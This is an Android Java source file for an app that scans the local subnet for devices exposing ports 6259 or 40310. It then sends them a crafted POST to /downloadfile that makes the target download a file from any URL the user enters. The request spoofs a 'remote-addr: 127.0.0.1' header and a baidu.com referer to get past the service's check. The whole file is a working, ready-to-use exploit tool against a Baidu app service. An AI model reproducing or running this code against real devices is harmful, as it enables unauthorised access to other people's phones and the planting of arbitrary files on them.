package com.wudi.baidu;

import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;

import okio.BufferedSink;

public class MainActivity extends AppCompatActivity {

    private TextView textView;
    private Button button, start;
    private EditText urlText, targetText;
    private final int timeout = 250;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) this.findViewById(R.id.text);
        button = (Button) this.findViewById(R.id.button);
        urlText = (EditText) this.findViewById(R.id.url);
        targetText = (EditText) this.findViewById(R.id.address);
        start = (Button) this.findViewById(R.id.start);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final String ip = Utils.getIPAddress(true);
                Log.d("hello", ip);
                textView.setText("扫描需要5分钟时间，请等待...");
                AsyncTask<Void, Void, List<String>> task = new AsyncTask<Void, Void, List<String>>() {
                    @Override
                    protected List<String> doInBackground(Void... params) {
                        return checkHosts(ip.substring(0, ip.lastIndexOf(".")));
                    }

                    @Override
                    protected void onPostExecute(List<String> strings) {
                        String ret = "";
                        for (String s : strings) {
                            ret += s + '\n';
                        }
                        textView.setText(ret);
                    }
                };
                task.execute();
            }
        });

        start.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
                    @Override
                    protected String doInBackground(Void... params) {
                        String url = "http://" + targetText.getText().toString() + "/downloadfile";

                        OkHttpClient client = new OkHttpClient();

                        RequestBody body = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "callback=callback1&mcmdf=inapp_baidu_bdgjs&querydown=download&downloadurl=" + urlText.getText().toString() + "&savepath=Download&filesize=10");

                        Request request = new Request.Builder()
                                .url(url).addHeader("remote-addr", "127.0.0.1").addHeader("referer", "http://www.baidu.com").post(body)
                                .build();

                        Response response = null;
                        try {
                            response = client.newCall(request).execute();
                            return response.body().string();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        return null;
                    }

                    @Override
                    protected void onPostExecute(String s) {
                        if (s!=null && s.contains("\"error\":0")) {
                            Toast.makeText(MainActivity.this,"成功",Toast.LENGTH_LONG).show();
                        }
                        else {
                            Toast.makeText(MainActivity.this,"失败",Toast.LENGTH_LONG).show();
                        }

                    }
                };

                task.execute();
            }
        });
    }

    private List<String> checkHosts(String subnet) {
        List<String> ret = new ArrayList<>();
        for (int i = 1; i < 255; i++) {
            String host = subnet + "." + i;

            if (isReachable(host, 6259)) {
                host += ":6259";
                ret.add(host);
            } else if (isReachable(host, 40310)) {
                host += ":40310";
                ret.add(host);
            }
        }

        return ret;
    }

    private boolean isReachable(String host, int port) {
        SocketAddress sockaddr = new InetSocketAddress(host, port);
        Socket socket = new Socket();
        try {
            socket.connect(sockaddr, timeout);
        } catch (Exception e) {
            return false;
        } finally {
            try {
                socket.close();
            } catch (IOException ex) {
            }
        }

        return true;
    }

}
